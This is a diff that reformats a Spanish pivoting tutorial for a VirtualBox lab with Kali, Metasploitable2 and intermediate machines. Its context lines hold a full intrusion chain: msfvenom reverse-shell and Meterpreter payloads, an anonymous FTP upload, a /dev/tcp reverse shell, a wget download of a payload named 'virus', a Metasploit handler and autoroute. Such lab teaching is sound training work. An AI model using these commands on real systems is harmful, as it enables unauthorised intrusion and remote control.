@@ -24,41 +24,53 @@ Ahora explicaré cómo configurar una red virtual en VirtualBox y asignar difere
 
 ### 1. Configuración de la Red en VirtualBox
 
-1. **Acceder al Administrador de Red:**
-   * En la ventana principal de VirtualBox, dirígete a la barra de menús superior y selecciona **Archivo** > **Herramientas** > **Administrador de red**.
-2. **Crear una nueva Red Interna (NAT):**
-   * En el Administrador de Red, localiza el apartado **Redes NAT**.
-   * Haz clic en el botón **Crear** para añadir una nueva red.
-3. **Asignación de la red NAT:**
-   * Dale un nombre a la red, por ejemplo, `Red_Pivoting`.
-   * Asigna el prefijo IPv4 de la red como `10.10.10.0/24`.
-   * Asegúrate de que se haya asignado correctamente y haz clic en **Aplicar**.
+**Acceder al Administrador de Red:**
+
+* En la ventana principal de VirtualBox, dirígete a la barra de menús superior y selecciona **Archivo** > **Herramientas** > **Administrador de red**.
+
+**Crear una nueva Red Interna (NAT):**
+
+* En el Administrador de Red, localiza el apartado **Redes NAT**.
+* Haz clic en el botón **Crear** para añadir una nueva red.
+
+**Asignación de la red NAT:**
+
+* Dale un nombre a la red, por ejemplo, `Red_Pivoting`.
+* Asigna el prefijo IPv4 de la red como `10.10.10.0/24`.
+* Asegúrate de que se haya asignado correctamente y haz clic en **Aplicar**.
 
 Ahora tienes configurada una red interna (NAT) que utilizarás para conectar las máquinas virtuales.
 
 ### 2. Configuración de la Máquina Windows 7
 
-1. **Acceder a la configuración de la máquina:**
-   * En VirtualBox, selecciona la máquina de Windows 7 y haz clic en **Configuración**.
-2. **Configuración de adaptadores de red:**
-   * En el panel de configuración de la máquina, ve a la sección **Red**.
-   * Habilita **Adaptador 2**, selecciona la opción **Conectado a** y elige **Red NAT**. Esta configuración le permitirá a la máquina Windows 7 comunicarse a través de la red NAT que acabamos de crear.
-3. **Verificación de interfaces de red:**
-   * Ahora la máquina Windows 7 tendrá dos interfaces de red: una asociada al adaptador puente (que se conecta a la red física de tu PC) y otra conectada a la red NAT que acabamos de configurar.
+**Acceder a la configuración de la máquina:**
+
+* En VirtualBox, selecciona la máquina de Windows 7 y haz clic en **Configuración**.
+
+**Configuración de adaptadores de red:**
+
+* En el panel de configuración de la máquina, ve a la sección **Red**.
+* Habilita **Adaptador 2**, selecciona la opción **Conectado a** y elige **Red NAT**. Esta configuración le permitirá a la máquina Windows 7 comunicarse a través de la red NAT que acabamos de crear.
+
+**Verificación de interfaces de red:**
+
+* Ahora la máquina Windows 7 tendrá dos interfaces de red: una asociada al adaptador puente (que se conecta a la red física de tu PC) y otra conectada a la red NAT que acabamos de configurar.
 
 ### 3. Configuración de la Máquina Metasploitable2
 
-1. **Configurar adaptador de red en Metasploitable2:**
-   * Selecciona la máquina Metasploitable2 en VirtualBox y ve a la configuración.
-   * Asegúrate de que **solo hay un adaptador de red** conectado y que esté configurado para usar **Red NAT**.
+**Configurar adaptador de red en Metasploitable2:**
+
+* Selecciona la máquina Metasploitable2 en VirtualBox y ve a la configuración.
+* Asegúrate de que **solo hay un adaptador de red** conectado y que esté configurado para usar **Red NAT**.
 
 Esto asegura que Metasploitable2 estará en la misma red NAT que la máquina Windows 7, pero sin interfaces adicionales que puedan complicar la configuración.
 
 ### 4. Configuración de la Máquina Kali Linux
 
-1. **Configurar adaptador de red para Kali Linux:**
-   * Selecciona la máquina Kali Linux y abre su configuración en VirtualBox.
-   * En la sección **Red**, configura el **Adaptador 1** como un **Adaptador puente**. Esto hará que Kali Linux se conecte directamente a la red física de tu equipo, permitiéndole interactuar con otras máquinas de la misma red local.
+**Configurar adaptador de red para Kali Linux:**
+
+* Selecciona la máquina Kali Linux y abre su configuración en VirtualBox.
+* En la sección **Red**, configura el **Adaptador 1** como un **Adaptador puente**. Esto hará que Kali Linux se conecte directamente a la red física de tu equipo, permitiéndole interactuar con otras máquinas de la misma red local.
 
 ### 5. Orden de Arranque
 
@@ -179,23 +191,28 @@ Abrimos el navegador con la IP de la máquina Windows 7 con el puerto 5000 porqu
 
 Para crear una red en VirtualBox y configurar las máquinas necesarias, sigue estos pasos:
 
-1. **Creación de Red NAT**:
-   * Ve a **Archivo** > **Herramientas** > **Administrador de red**.
-   * Crea una red NAT con el nombre `Red_Pivoting` y asigna la dirección IP `10.10.10.0/24`.
-2. **Configuración de Máquinas Virtuales**:
-   * **Máquina Kali**:
-     * En la configuración de red, elige **Adaptador puente** para el único adaptador de red activo.
-   * **Máquina Friendly** (Máquina intermedia):
-     * Configura el **primer adaptador** como **Adaptador puente**.
-     * Configura el **segundo adaptador** en modo **Red NAT** y selecciona la red `Red_Pivoting`.
-   * **Máquina Basic** (Máquina final):
-     * Activa solo un adaptador de red y configúralo en modo **Red NAT**, seleccionando la red `Red_Pivoting`.
-3. **Iniciar Máquinas**:
-   * Con las configuraciones completadas, inicia las máquinas en el orden necesario.
+**Creación de Red NAT**:
+
+* Ve a **Archivo** > **Herramientas** > **Administrador de red**.
+* Crea una red NAT con el nombre `Red_Pivoting` y asigna la dirección IP `10.10.10.0/24`.
+
+**Configuración de Máquinas Virtuales**:
+
+* **Máquina Kali**:
+  * En la configuración de red, elige **Adaptador puente** para el único adaptador de red activo.
+* **Máquina Friendly** (Máquina intermedia):
+  * Configura el **primer adaptador** como **Adaptador puente**.
+  * Configura el **segundo adaptador** en modo **Red NAT** y selecciona la red `Red_Pivoting`.
+* **Máquina Basic** (Máquina final):
+  * Activa solo un adaptador de red y configúralo en modo **Red NAT**, seleccionando la red `Red_Pivoting`.
+
+**Iniciar Máquinas**:
+
+* Con las configuraciones completadas, inicia las máquinas en el orden necesario.
 
 ### 2. Detección y Exploración de Vulnerabilidades
 
-#### Paso 1: Identificación de la Máquina Objetivo
+#### Identificación de la Máquina Objetivo
 
 Desde la máquina Kali, ejecuta el siguiente comando para identificar dispositivos en la red local:
 
@@ -203,7 +220,7 @@ Desde la máquina Kali, ejecuta el siguiente comando para identificar dispositiv
 arp-scan -I eth0 --localnet
 ```
 
-#### Paso 2: Escaneo de Vulnerabilidades con Nmap
+#### Escaneo de Vulnerabilidades con Nmap
 
 Realiza un escaneo con Nmap en la máquina objetivo para detectar posibles vulnerabilidades. Utiliza el siguiente comando:
 
@@ -215,11 +232,11 @@ En los resultados, se observa que los puertos **80** y **21** están abiertos.
 
 ### 3. Acceso a la Máquina Vulnerable
 
-#### Paso 1: Exploración del Servicio FTP
+#### Exploración del Servicio FTP
 
 El puerto **21** (FTP) está abierto, permitiendo autenticación con el usuario `anonymous` y una contraseña en blanco (comportamiento predeterminado).
 
-#### Paso 2: Creación del Payload
+#### Creación del Payload
 
 Genera un payload para obtener acceso remoto con `msfvenom`:
 
@@ -227,7 +244,7 @@ Genera un payload para obtener acceso remoto con `msfvenom`:
 msfvenom -p php/reverse_php LHOST=<IP máquina atacante> LPORT=443 -f raw > pwnws.php
 ```
 
-#### Paso 3: Subida del Payload
+#### Subida del Payload
 
 Accede al servicio FTP y sube el payload utilizando el siguiente comando:
 
@@ -235,7 +252,7 @@ Accede al servicio FTP y sube el payload utilizando el siguiente comando:
 put pwned.php
 ```
 
-#### Paso 4: Configuración de Escucha
+#### Configuración de Escucha
 
 Pon el puerto 443 en escucha para recibir la conexión inversa:
 
@@ -243,7 +260,7 @@ Pon el puerto 443 en escucha para recibir la conexión inversa:
 nc -nlvp 443
 ```
 
-#### Paso 5: Carga del Payload
+#### Carga del Payload
 
 Para activar el payload y obtener acceso, visita la siguiente URL:
 
@@ -253,7 +270,7 @@ http://<IP máquina víctima>/pwned.php
 
 ### 4. Estabilización de la Conexión y Creación de Payload para Meterpreter
 
-#### Paso 1: Estabilización de la Conexión
+#### Estabilización de la Conexión
 
 Dado que la conexión inicial no es estable, creamos una nueva escucha en el puerto **444**:
 
@@ -267,7 +284,7 @@ Luego, transferimos la sesión del puerto **443** al **444** con el siguiente co
 bash -c "sh -i >& /dev/tcp/<IP máquina atacante>/444 0>&1"
 ```
 
-#### Paso 2: Creación de un Payload para Meterpreter
+#### Creación de un Payload para Meterpreter
 
 Para mejorar el control sobre la máquina, generamos un payload de Meterpreter con `msfvenom`:
 
@@ -275,7 +292,7 @@ Para mejorar el control sobre la máquina, generamos un payload de Meterpreter c
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP máquina atacante> LPORT=4444 -f elf -b '\x00\x0a\x0d' -o virus
 ```
 
-#### Paso 3: Compartir el Payload
+#### Compartir el Payload
 
 Inicia un servidor web en Python para facilitar la transferencia del archivo malicioso a la máquina víctima:
 
@@ -293,7 +310,7 @@ wget http://1.2.3.4/virus
 
 ### 5. Configuración de Metasploit para Recibir la Sesión
 
-#### Paso 1: Iniciar el Handler en Metasploit
+#### Iniciar el Handler en Metasploit
 
 Abre Metasploit y selecciona el módulo de handler:
 
@@ -301,7 +318,7 @@ Abre Metasploit y selecciona el módulo de handler:
 use multi/handler
 ```
 
-#### Paso 2: Verificar Opciones del Módulo
+#### Verificar Opciones del Módulo
 
 Muestra las opciones del módulo seleccionado:
 
@@ -309,7 +326,7 @@ Muestra las opciones del módulo seleccionado:
 show options
 ```
 
-#### Paso 3: Configuración del Payload
+#### Configuración del Payload
 
 Elige el payload de Meterpreter adecuado para Linux:
 
@@ -317,7 +334,7 @@ Elige el payload de Meterpreter adecuado para Linux:
 set PAYLOAD linux/x86/meterpreter/reverse_tcp
 ```
 
-#### Paso 4: Configuración de Dirección IP
+#### Configuración de Dirección IP
 
 Asigna la dirección IP de la máquina atacante:
 
@@ -325,7 +342,7 @@ Asigna la dirección IP de la máquina atacante:
 set LHOST <IP máquina atacante>
 ```
 
-#### Paso 5: Ejecutar el Handler
+#### Ejecutar el Handler
 
 Inicia el handler para recibir la sesión:
 
@@ -335,7 +352,7 @@ run
 
 ### 6. Ejecución del Payload en la Máquina Víctima
 
-#### Paso 1: Asignar Permisos de Ejecución
+#### Asignar Permisos de Ejecución
 
 En la máquina intermedia **Friendly**, otorga permisos de ejecución al archivo malicioso:
 
@@ -343,7 +360,7 @@ En la máquina intermedia **Friendly**, otorga permisos de ejecución al archivo
 chmod +x virus
 ```
 
-#### Paso 2: Ejecutar el Payload
+#### Ejecutar el Payload
 
 Inicia la ejecución del archivo para enviar la sesión a Metasploit:
 
@@ -404,12 +421,13 @@ Observaremos dos interfaces de red:
 
 Para escanear otros dispositivos en la red, enviamos la sesión actual de **Meterpreter** a segundo plano:
 
-* Usar `Ctrl + Z` para minimizar la sesión.
-*   Confirmar que la sesión sigue activa con:
+Usar `Ctrl + Z` para minimizar la sesión.
 
-    ```bash
-    sessions -l
-    ```
+Confirmar que la sesión sigue activa con:
+
+```bash
+sessions -l
+```
 
 ### 3. Añadir Rutas y Configurar Enrutamiento
 
@@ -419,21 +437,23 @@ Configuramos el enrutamiento para escanear la red interna cargando el módulo `a
 use multi/manage/autoroute
 ```
 
-*   Asigna el **SESSION ID** adecuado (en este caso, `1`):
+Asigna el **SESSION ID** adecuado (en este caso, `1`):
 
-    ```bash
-    set SESSION 1
-    ```
-*   Ejecuta el módulo:
+```bash
+set SESSION 1
+```
 
-    ```bash
-    run
-    ```
-*   Verifica el enrutamiento configurado:
+Ejecuta el módulo:
 
-    ```bash
-    route
-    ```
+```bash
+run
+```
+
+Verifica el enrutamiento configurado:
+
+```bash
+route
+```
 
 ### 4. Crear un Script de Escaneo de Red en Bash
 
@@ -462,31 +482,35 @@ Este script envía un **ping** a las IPs en el rango `10.0.10.1 - 10.0.10.255` p
 
 Para transferir el script a la máquina intermedia:
 
-1.  Inicia un servidor HTTP en tu máquina:
+Inicia un servidor HTTP en tu máquina:
 
-    ```bash
-    python3 -m http.server 80
-    ```
-2.  Desde la sesión de Meterpreter, descarga el script en **Friendly**:
+```bash
+python3 -m http.server 80
+```
 
-    ```bash
-    wget <IP del servidor>/escaner.sh
-    ```
-3.  Verifica que el archivo se transfirió correctamente:
+Desde la sesión de Meterpreter, descarga el script en **Friendly**:
 
-    ```bash
-    ls
-    ```
-4.  Asigna permisos de ejecución al archivo:
+```bash
+wget <IP del servidor>/escaner.sh
+```
 
-    ```bash
-    chmod +x escaner.sh
-    ```
-5.  Ejecuta el script para ver los hosts activos en la red interna:
+Verifica que el archivo se transfirió correctamente:
 
-    ```bash
-    ./escaner.sh
-    ```
+```bash
+ls
+```
+
+Asigna permisos de ejecución al archivo:
+
+```bash
+chmod +x escaner.sh
+```
+
+Ejecuta el script para ver los hosts activos en la red interna:
+
+```bash
+./escaner.sh
+```
 
 ### 6. Escaneo de Puertos con Metasploit
 
